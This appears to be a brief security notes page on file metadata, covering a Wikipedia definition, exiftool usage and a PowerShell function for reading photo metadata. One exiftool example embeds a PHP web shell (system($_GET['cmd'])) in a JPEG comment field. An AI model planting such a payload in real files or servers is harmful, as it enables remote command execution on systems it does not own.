# Metadata

## Metadata

If you want to find information about a file, this is when metadata comes into place.

 **Metadata** is "[data](https://en.wikipedia.org/wiki/Data) that provides information about other data".[\[1\]](https://en.wikipedia.org/wiki/Metadata#cite_note-1) In other words, it is "data about data". Many distinct types of metadata exist, including **descriptive metadata**, **structural metadata**, **administrative metadata**,[\[2\]](https://en.wikipedia.org/wiki/Metadata#cite_note-Metadata_Basics_Outline-2) **reference metadata**, **statistical metadata**[\[3\]](https://en.wikipedia.org/wiki/Metadata#cite_note-:4-3) and **legal metadata**. This text was extracted from [Wikipedia](https://en.wikipedia.org/wiki/Metadata).

### exiftool

We can use the exiftool to extract metadata:

```text
exiftool filename
```

Insert metadata:

```text
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.jpg
```

### PowerShell Get-FileMetaData

The [Get-FileMetaDataReturnObject.ps1](https://github.com/mattlite/powershell/blob/master/Get-FileMetaDataReturnObject.ps1) script contains a single function. The function is the **Get-FileMetadata** function. I load the function in the Windows PowerShell ISE, and run it to copy the function into memory. After I have done that, I call the function and pass it an array of folder paths. I get the array of folder paths by using the **Get-ChildItem** cmdlet. Here is the command that performs a recursive lookup of a folder named pics and pulls out the directory paths in that folder. This is a single line command that has wrapped.

```text
$picMetadata = Get-FileMetaData -folder (Get-childitem E:\pics -Recurse -Directory).FullName
```

## References

{% embed url="https://devblogs.microsoft.com/scripting/use-powershell-to-find-metadata-from-photograph-files/" %}



